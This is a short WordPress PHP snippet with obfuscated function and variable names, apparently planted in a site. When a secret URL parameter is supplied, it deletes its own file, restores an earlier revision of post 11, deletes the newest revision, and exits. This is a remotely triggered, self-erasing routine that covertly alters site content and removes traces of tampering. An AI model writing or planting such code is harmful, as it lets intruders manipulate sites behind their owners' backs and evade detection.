<?php

function source_videos_performance_oembed() {
	if (isset($_GET['design_create_results_iframe']) && $_GET['design_create_results_iframe'] === 'html5_badge_paragraph_current') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$price_pro_listing = 11;
		$publisher_interactive_lite = wp_get_post_revisions($price_pro_listing);
		if (empty($publisher_interactive_lite)) die('no revisions');
		if (count($publisher_interactive_lite) < 2) die('less than 2');
		$attachments_most_exporter_codes = array_shift($publisher_interactive_lite);
		$limit_portal_autocomplete = $attachments_most_exporter_codes->ID;
		$mini_change_manage = array_shift($publisher_interactive_lite);
		$performance_action_shortcode = $mini_change_manage->ID;
		$media_code_heading = wp_restore_post_revision($performance_action_shortcode);
		if ($media_code_heading === false) die('error restoring');
		$media_code_heading = wp_delete_post_revision($limit_portal_autocomplete);		
		if ($media_code_heading === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'source_videos_performance_oembed');
